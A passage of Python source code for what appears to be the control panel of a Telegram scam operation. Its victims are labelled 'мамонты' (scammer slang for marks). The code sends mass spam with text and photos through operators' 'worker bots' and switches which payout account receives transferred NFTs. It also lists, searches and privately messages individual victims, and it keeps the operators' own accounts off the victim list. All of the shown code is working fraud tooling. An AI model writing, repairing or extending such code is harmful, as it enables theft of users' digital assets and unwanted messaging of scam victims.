    await state.set_state(SpamBot.waiting_photo)
    await cb.message.answer(
        "<b>Отправь фото, которое нужно добавить к рассылке.</b>",
        parse_mode="HTML"
    )
    await cb.answer()

@router.message(SpamBot.waiting_photo)
async def handle_spam_photo(message: types.Message, state: FSMContext):
    if not message.photo:
        await message.answer("<b>❌ Отправь именно фото!</b>", parse_mode="HTML")
        return
    data = await state.get_data()
    bot_id = data["bot_id"]
    spam_text = data["spam_text"]
    file = await message.bot.get_file(message.photo[-1].file_id)
    file_path = file.file_path
    temp_path = os.path.join(TEMP_IMG_DIR, f"{message.photo[-1].file_id}.jpg")
    await message.bot.download_file(file_path, temp_path)

    img_url = await upload_image_from_file(temp_path)
    try:
        os.remove(temp_path)
    except Exception:
        pass

    if not img_url:
        await message.answer("<b>❌ Не удалось загрузить фото на imgbb. Попробуй позже или другое фото.</b>", parse_mode="HTML")
        return

    await state.clear()
    await message.answer("<b>✅ Рассылка с фото запущена, ожидайте статистику.</b>", parse_mode="HTML")
    asyncio.create_task(run_spam_with_photo_url(bot_id, spam_text, img_url))

async def run_spam_with_photo_url(bot_id: int, spam_text: str, img_url: str):
    from loader import bot as main_bot
    sem = Semaphore(10)
    async with Session() as session:
        stmt = select(WorkerBot).where(WorkerBot.id == bot_id).options(selectinload(WorkerBot.owner))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()
        if not bot:
            return

        stmt_users = select(WorkerBotUser.telegram_id).where(WorkerBotUser.worker_bot_id == bot.id)
        result = await session.execute(stmt_users)
        user_ids = [row[0] for row in result.fetchall()]
        total = len(user_ids)

    success = 0
    failed = 0
    bot_client = Bot(token=bot.token, default=DefaultBotProperties(parse_mode="HTML"))

    async def send_one(uid):
        nonlocal success, failed
        async with sem:
            try:
                await bot_client.send_photo(chat_id=uid, photo=img_url, caption=spam_text, parse_mode="HTML")
                success += 1
            except Exception:
                failed += 1

    try:
        for i in range(0, len(user_ids), 20):
            chunk = user_ids[i:i + 20]
            await gather(*(send_one(uid) for uid in chunk))
            await sleep(1)
    finally:
        await bot_client.session.close()

    owner_id = bot.owner.telegram_id
    result_text = (
        f"<b>📊 Статистика рассылки (с фото)</b>\n\n"
        f"<b>👥 Всего пользователей: {total}</b>\n"
        f"<b>✅ Успешно отправлено: {success}</b>\n"
        f"<b>❌ Не доставлено: {failed}</b>"
    )

    try:
        await main_bot.send_message(chat_id=owner_id, text=result_text)
    except Exception:
        pass

async def run_spam_in_background(bot_id: int, spam_text: str):
    from loader import bot as main_bot
    sem = Semaphore(10)
    async with Session() as session:
        stmt = select(WorkerBot).where(WorkerBot.id == bot_id).options(selectinload(WorkerBot.owner))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()
        if not bot:
            return

        stmt_users = select(WorkerBotUser.telegram_id).where(WorkerBotUser.worker_bot_id == bot.id)
        result = await session.execute(stmt_users)
        user_ids = [row[0] for row in result.fetchall()]
        total = len(user_ids)

    success = 0
    failed = 0
    bot_client = Bot(token=bot.token, default=DefaultBotProperties(parse_mode="HTML"))

    async def send_one(uid):
        nonlocal success, failed
        async with sem:
            try:
                await bot_client.send_message(chat_id=uid, text=spam_text)
                success += 1
            except Exception:
                failed += 1

    try:
        for i in range(0, len(user_ids), 20):
            chunk = user_ids[i:i + 20]
            await gather(*(send_one(uid) for uid in chunk))
            await sleep(1)
    finally:
        await bot_client.session.close()

    owner_id = bot.owner.telegram_id
    result_text = (
        f"<b>📊 Статистика рассылки</b>\n\n"
        f"<b>👥 Всего пользователей: {total}</b>\n"
        f"<b>✅ Успешно отправлено: {success}</b>\n"
        f"<b>❌ Не доставлено: {failed}</b>"
    )

    try:
        await main_bot.send_message(chat_id=owner_id, text=result_text)
    except Exception:
        pass

@router.callback_query(F.data.startswith("bot_change_transfer_"))
async def change_nft_transfer(callback: types.CallbackQuery):
    bot_id = int(callback.data.split("_")[-1])
    tg_id = callback.from_user.id

    async with Session() as session:
        stmt_admin = select(Admin).options(selectinload(Admin.settings)).where(Admin.telegram_id == tg_id)
        result = await session.execute(stmt_admin)
        admin = result.scalar_one_or_none()

        if not admin or not admin.settings or not admin.settings.payout_ids:
            await callback.answer("❌ Нет доступных аккаунтов для передачи.\nДобавьте их в настройках.", show_alert=True)
            return

        payout_ids = [pid.strip() for pid in admin.settings.payout_ids.split(",") if pid.strip()]

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"ID: {pid}", callback_data=f"reassign_transfer_{bot_id}_{pid}")]
            for pid in payout_ids
        ] + [[InlineKeyboardButton(text="Назад", callback_data=f"bot_{bot_id}")]]
    )

    await callback.message.edit_text(
        "<b>📦 Выберите новый аккаунт для передачи NFT:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("reassign_transfer_"))
async def reassign_nft_transfer(callback: types.CallbackQuery):
    try:
        _, _, bot_id_str, nft_id_str = callback.data.split("_")
        bot_id = int(bot_id_str)
        nft_id = int(nft_id_str)
        tg_id = callback.from_user.id
    except Exception:
        await callback.answer("❌ Неверный формат данных", show_alert=True)
        return

    async with Session() as session:
        stmt = select(WorkerBot).where(
            WorkerBot.id == bot_id,
            WorkerBot.owner.has(telegram_id=tg_id)
        )
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()

        if not bot:
            await callback.answer("❌ Бот не найден или не принадлежит вам", show_alert=True)
            return

        bot.nft_transfer_to_id = nft_id
        await session.commit()

    await callback.answer("✅ Передача успешно изменена.", show_alert=True)
    await callback.message.delete()
    await show_bot_info_message(callback.message.chat.id, bot_id)

############################################## Мамонты ##############################################

@router.callback_query(F.data.startswith("show_mamonty"))
async def show_mamonty_menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()  
    await show_mamonty_menu_core(callback)

async def show_mamonty_menu_core(callback: types.CallbackQuery):
    tg_id = callback.from_user.id
    parts = callback.data.split(":")
    page = int(parts[1]) if len(parts) > 1 else 1

    exclude_ids = set(PANEL_OWNERS + [OWNER_ACCOUNT_ID])

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await callback.answer("Профиль не найден", show_alert=True)
            return

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()

        bot_map = {}
        total = 0
        page_users = []

        if bots_ids:
            count_query = (
                select(func.count(func.distinct(WorkerBotUser.telegram_id)))
                .where(WorkerBotUser.worker_bot_id.in_(bots_ids))
            )
            total = (await session.execute(count_query)).scalar_one()
            pages = (total + MAMONTY_PER_PAGE - 1) // MAMONTY_PER_PAGE
            page = max(1, min(page, pages)) if pages else 1
            offset = (page - 1) * MAMONTY_PER_PAGE

            users_query = (
                select(WorkerBotUser)
                .where(WorkerBotUser.worker_bot_id.in_(bots_ids))
                .distinct(WorkerBotUser.telegram_id)
                .offset(offset)
                .limit(MAMONTY_PER_PAGE)
            )
            page_users = (await session.execute(users_query)).scalars().all()
            page_users = [u for u in page_users if u.telegram_id not in exclude_ids]

            if not page_users:
                await callback.answer("❗️У вас нет мамонтов.", show_alert=True)
                return

            bot_usernames = (await session.execute(
                select(WorkerBot.id, WorkerBot.username)
                .where(WorkerBot.id.in_([user.worker_bot_id for user in page_users]))
            )).all()
            bot_map = {bot_id: username for bot_id, username in bot_usernames}
        else:
            pages = 1
            page = 1

    start = (page - 1) * MAMONTY_PER_PAGE

    mamonty_text = "\n".join(
        f"{i + 1 + start}. <b>@{user.username or '-'}</b> | <b>ID</b> <code>{user.telegram_id}</code> | <b>Бот: @{bot_map.get(user.worker_bot_id, '-')}</b>"
        for i, user in enumerate(page_users)
    )
    text = f"<b>🙆🏻‍♀️ Мамонты ({total}):</b>\n\n{mamonty_text}"

    nav = [
        InlineKeyboardButton(text="<", callback_data=f"show_mamonty:{page - 1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{pages}" if pages else "1/1", callback_data="ignore"),
        InlineKeyboardButton(text=">", callback_data=f"show_mamonty:{page + 1}" if page < pages else "ignore")
    ]

    keyboard = []
    keyboard.append(nav)
    keyboard.append([
        InlineKeyboardButton(text="Поиск мамонта", callback_data="mamonty_search"),
        InlineKeyboardButton(text="Написать мамонту", callback_data="messeng_spam")
    ])
    keyboard.append([
        InlineKeyboardButton(text="Назад", callback_data="show_bots_menu_0")
    ])

    markup = InlineKeyboardMarkup(inline_keyboard=keyboard)

    await callback.message.edit_text(
        text,
        reply_markup=markup,
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data == "ignore")
async def ignore_callback(callback: types.CallbackQuery):
    await callback.answer()

@router.callback_query(F.data == "back_to_mamonty")
async def mamonty_back_handler(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await show_mamonty_menu_core(callback)
    await callback.answer()

@router.callback_query(F.data == "messeng_spam")
async def mamonty_spam_prompt(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(MamontyStates.waiting_user_id)
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await callback.message.edit_text(
        "<b>✉️ Введите ID мамонта, которому хотите написать:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(MamontyStates.waiting_user_id)
async def get_user_id(message: types.Message, state: FSMContext):
    user_id = message.text.strip()
    if not user_id.isdigit():
        await message.answer("<b>❌ Введите корректный ID (число):</b>", parse_mode="HTML")
        return

    await state.update_data(user_id=int(user_id))
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await state.set_state(MamontyStates.waiting_message)
    await message.answer(
        "<b>📝 Введите сообщение, которое отправим этому мамонту:</b>\n"
        "<i>Вы можете использовать любое форматирование текста</i>",
        reply_markup=kb,
        parse_mode="HTML"
    )

@router.message(MamontyStates.waiting_message)
async def send_message_to_mamont(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get("user_id")
    await state.clear()
    asyncio.create_task(run_send_mamont_message(message, user_id))

async def run_send_mamont_message(message, user_id):
    return_kb = InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="Вернуться", callback_data="back_to_mamonty")]]
    )

    if message.photo or message.video or message.document or message.audio or message.voice or message.sticker:
        await message.answer(
            "<b>❌ Отправка фото, видео, файлов, стикеров и аудио запрещена.</b>",
            reply_markup=return_kb,
            parse_mode="HTML"
        )
        return

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == message.from_user.id))
        if not admin:
            await message.answer("<b>❌ Админ не найден!</b>", reply_markup=return_kb, parse_mode="HTML")
            return

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()

        user = await session.scalar(
            select(WorkerBotUser).where(
                WorkerBotUser.telegram_id == user_id,
                WorkerBotUser.worker_bot_id.in_(bots_ids)
            )
        )
        if not user:
            await message.answer("<b>❌ Мамонт не найден или не твой!</b>", reply_markup=return_kb, parse_mode="HTML")
            return

        bot_obj = await session.get(WorkerBot, user.worker_bot_id)
        if not bot_obj:
            await message.answer("<b>❌ Бот не найден!</b>", reply_markup=return_kb, parse_mode="HTML")
            return

    bot_client = Bot(token=bot_obj.token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    try:
        await bot_client.send_message(chat_id=user_id, text=message.html_text, parse_mode="HTML")
        await message.answer(
            "<b>✅ Сообщение отправлено!</b>",
            reply_markup=return_kb,
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(
            f"<b>❌ Мамонт заблокировал бота:\n</b>",
            reply_markup=return_kb,
            parse_mode="HTML"
        )
    finally:
        await bot_client.session.close()

@router.callback_query(F.data == "mamonty_search")
async def mamonty_search_prompt(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(MamontySearchState.waiting_query)
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await callback.message.edit_text(
        "<b>🔍 Введите ID или username мамонта:</b>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(MamontySearchState.waiting_query)
async def mamonty_search_process(message: types.Message, state: FSMContext):
    query = message.text.strip().lstrip('@')
    tg_id = message.from_user.id

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        if not admin:
            await message.answer("<b>❌ Профиль не найден!</b>", parse_mode="HTML")
            return

        bots_ids = (await session.execute(
            select(WorkerBot.id).where(WorkerBot.owner_id == admin.id)
        )).scalars().all()

        user = None
        if query.isdigit():
            user = await session.scalar(
                select(WorkerBotUser)
                .where(WorkerBotUser.telegram_id == int(query),
                       WorkerBotUser.worker_bot_id.in_(bots_ids))
            )
        if not user and query:
            user = await session.scalar(
                select(WorkerBotUser)
                .where(WorkerBotUser.username == query,
                       WorkerBotUser.worker_bot_id.in_(bots_ids))
            )
        if not user:
            kb = InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]]
            )
            await message.answer("<b>❌ Мамонт не найден!</b>", reply_markup=kb, parse_mode="HTML")
            return

        bot_obj = await session.get(WorkerBot, user.worker_bot_id)

    text = (
        f"<b>🙆🏻‍♀️ Мамонт найден:</b>\n\n"
        f"<b>Тэг:</b> @{user.username or '-'}\n"
        f"<b>ID:</b> <code>{user.telegram_id}</code>\n"
        f"<b>Бот:</b> @{bot_obj.username or '-'}\n"
    )
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Написать мамонту", callback_data=f"send_msg_to_mamont:{user.telegram_id}")],
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await message.answer(text, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("send_msg_to_mamont:"))
async def send_msg_to_mamont_callback(callback: types.CallbackQuery, state: FSMContext):
    user_id = int(callback.data.split(":")[-1])
    await state.update_data(user_id=user_id)
    await state.set_state(MamontySearchState.waiting_message)

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="back_to_mamonty")]
        ]
    )
    await callback.message.edit_text(
        "<b>📝 Введите сообщение, которое отправим этому мамонту:</b>\n<i>Вы можете использовать любое форматирование текста</i>",
        reply_markup=kb,
        parse_mode="HTML"
    )
    await callback.answer()

@router.message(MamontySearchState.waiting_message)
async def mamonty_send_message_from_search(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get("user_id")
    await state.clear()
    asyncio.create_task(run_send_mamont_message(message, user_id))